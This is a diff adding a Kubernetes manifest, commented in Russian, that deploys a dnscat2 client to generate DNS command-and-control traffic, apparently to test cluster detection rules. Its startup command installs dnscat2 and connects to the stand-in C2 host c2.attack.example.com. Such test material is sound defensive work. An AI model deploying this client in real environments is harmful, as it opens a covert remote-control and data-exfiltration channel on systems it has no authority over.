@@ -1,0 +1,51 @@
+# dnscat2 client — C2 over DNS. Генерирует трафик: C2_BEACON, C2_TXT_REQUEST, HIGH_ENTROPY.
+#
+# Требуется: снаружи кластера должен работать dnscat2 server.
+# 1) Запустить: dnscat2 yourdomain.com (или с --secret=...).
+# 2) Делегировать поддомен на сервер (NS или A, сервер слушает на 53).
+# 3) Задать ATTACK_DOMAIN и задеплоить. Клиент установит gem при первом старте (~1–2 мин).
+#
+# Образ с Ruby: при первом запуске выполняется gem install dnscat2, затем запуск клиента.
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: dnscat2-client
+  namespace: attack
+  labels:
+    app: attack-traffic
+    tool: dnscat2
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: attack-traffic
+      tool: dnscat2
+  template:
+    metadata:
+      labels:
+        app: attack-traffic
+        tool: dnscat2
+    spec:
+      containers:
+        - name: dnscat2
+          image: ruby:3.2-alpine
+          command: ["/bin/sh", "-c"]
+          args:
+            - |
+              apk add --no-cache build-base
+              gem install dnscat2
+              exec dnscat2 "$ATTACK_DOMAIN"
+          env:
+            - name: ATTACK_DOMAIN
+              value: "c2.attack.example.com"
+            - name: DNSCAT2_SECRET
+              value: ""
+          resources:
+            requests:
+              cpu: 100m
+              memory: 128Mi
+            limits:
+              cpu: 500m
+              memory: 256Mi
+      restartPolicy: Always
